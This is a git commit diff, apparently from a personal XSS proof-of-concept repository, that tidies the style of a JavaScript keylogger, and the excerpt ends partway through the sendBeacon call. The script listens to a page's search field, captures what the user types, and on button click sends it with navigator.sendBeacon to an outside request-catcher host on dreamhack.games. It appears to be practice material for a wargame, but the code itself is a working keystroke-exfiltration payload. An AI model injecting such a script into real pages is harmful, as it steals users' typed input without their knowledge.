2b1e3d9479270a0bd244ee8a2595e6605ce02622
JUNG SOON HO <ajsoon98@naver.com>
2025-12-29 12:38:06 +0900

    Update Keylogger2.js

--- XSS_POC/Keylogger/Keylogger2.js
+++ XSS_POC/Keylogger/Keylogger2.js
@@ -1,14 +1,13 @@
 const search_word = document.getElementsByName("search_word")[0];
+let search_keylog = "";
 
-var search_keylog = "";
-
-search_word.addEventListener("input", (e) => {
+search_word.addEventListener("input", e => {
     search_keylog = e.target.value;
 });
 
 const search_btn = document.getElementsByTagName("button")[0];
 
-search_btn.addEventListener('click', (e) => {
+search_btn.addEventListener("click", e => {
     e.preventDefault();
     navigator.sendBeacon(
         "https://hbeqqxv.request.dreamhack.games",
